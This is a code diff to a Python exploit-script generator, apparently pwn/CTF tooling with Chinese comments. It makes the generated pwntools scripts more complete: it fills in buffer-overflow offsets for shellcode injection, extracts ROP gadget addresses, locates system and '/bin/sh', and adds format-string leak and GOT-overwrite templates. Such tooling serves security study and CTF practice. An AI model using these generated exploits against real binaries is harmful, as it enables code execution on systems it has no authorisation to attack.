@@ -306,6 +306,8 @@ def _generate_exploit_script(binary_info: Dict, exploit_info: Dict) -> str:
     """生成exploit脚本"""
     arch = binary_info.get("arch", "x64")
     binary_path = binary_info.get("path", "./binary")
+    gadgets = binary_info.get("gadgets", [])
+    protections = binary_info.get("protections", {})
 
     script = f'''#!/usr/bin/env python3
 # Auto-generated PWN exploit script
@@ -321,6 +323,8 @@ context(arch=arch, os='linux', log_level='debug')
 # Load binary
 elf = ELF(binary_path)
 
+# Protections: {protections}
+
 '''
 
     # 添加exploit特定代码
@@ -328,12 +332,19 @@ elf = ELF(binary_path)
 
     if method == "shellcode_injection":
         shellcode = exploit_info.get("shellcode", "")
+
+        # 从gadgets中查找偏移提示
+        offset_hint = exploit_info.get("offset", 0)
+        if offset_hint == 0:
+            offset_hint = exploit_info.get("buffer_size", 64) + 8
+
         script += f'''
 # Shellcode
 shellcode = bytes.fromhex("{shellcode}")
 
-# TODO: Calculate offset
-offset = 0  # Replace with actual offset
+# Offset calculation
+# Use cyclic pattern to find exact offset: cyclic(200), cyclic_find(core.pc)
+offset = {offset_hint}  # Adjust based on analysis
 
 # Build payload
 payload = b'A' * offset
@@ -343,31 +354,84 @@ payload += shellcode
 
     elif method == "rop_chain":
         rop = exploit_info.get("rop_chain", {})
+
+        # 从gadgets中提取地址
+        pop_rdi_addr = "0x0"
+        pop_rsi_addr = "0x0"
+        ret_addr = "0x0"
+
+        for g in gadgets[:20]:  # 检查前20个gadget
+            g_str = str(g).lower()
+            if 'pop rdi' in g_str and 'ret' in g_str:
+                # 提取地址: "0x1234: pop rdi; ret"
+                parts = g.split(':')
+                if parts:
+                    pop_rdi_addr = parts[0].strip()
+            elif 'pop rsi' in g_str and 'ret' in g_str:
+                parts = g.split(':')
+                if parts:
+                    pop_rsi_addr = parts[0].strip()
+            elif g_str.strip().endswith('ret') and 'pop' not in g_str:
+                parts = g.split(':')
+                if parts:
+                    ret_addr = parts[0].strip()
+
         script += f'''
 # ROP Chain
-# {rop.get('chain_steps', [])}
+# Chain steps: {rop.get('chain_steps', [])}
 
-# TODO: Fill in addresses
-pop_rdi = 0x0  # Find with ROPgadget
-bin_sh = 0x0   # Find in binary or libc
-system = 0x0   # From libc or PLT
+# Gadgets found during analysis
+pop_rdi = {pop_rdi_addr}  # pop rdi; ret
+pop_rsi = {pop_rsi_addr}  # pop rsi; ret (if available)
+ret_gadget = {ret_addr}   # ret (for stack alignment)
 
-# Build ROP chain
+# Functions from binary
+# Use: elf.symbols['system'] or elf.plt['system']
+# Use: next(elf.search(b"/bin/sh\\x00")) for "/bin/sh" string
+
+# Build ROP chain dynamically
 rop = ROP(elf)
-# rop.call(system, [bin_sh])
+
+# Try to find addresses automatically
+try:
+    if 'system' in elf.symbols:
+        system_addr = elf.symbols['system']
+    elif 'system' in elf.plt:
+        system_addr = elf.plt['system']
+    else:
+        system_addr = 0x0  # Manual: find in libc
+
+    bin_sh = next(elf.search(b"/bin/sh\\x00"), 0x0)
+
+    print(f"[*] system: {{hex(system_addr)}}")
+    print(f"[*] /bin/sh: {{hex(bin_sh)}}")
+except Exception as e:
+    print(f"[!] Error finding addresses: {{e}}")
 
 '''
 
     elif method == "format_string":
+        fmt_offset = exploit_info.get("format_offset", 6)
+        targets = exploit_info.get('targets', [])
+
         script += f'''
 # Format String Exploitation
-# Target: {exploit_info.get('targets', [])}
+# Targets: {targets}
 
-# Step 1: Find format string offset
-# Use cyclic pattern or manual testing
+# Format string offset (found via testing with %p)
+# Use: printf("AAAA%p.%p.%p...") to find offset
+fmt_offset = {fmt_offset}
 
-# Step 2: Build write primitive
-# Example: write address to __free_hook
+# Step 1: Leak addresses
+# payload = f"%{{fmt_offset}}$p"  # Leak stack value
+
+# Step 2: Write primitive
+# To write 4 bytes to target_addr:
+# payload = f"%{{value}}c%{{fmt_offset}}$n".encode()
+
+# Example: Overwrite GOT entry
+# target = elf.got['puts']  # Target address
+# payload = fmtstr_payload(fmt_offset, {{target: new_value}})
 
 '''
 
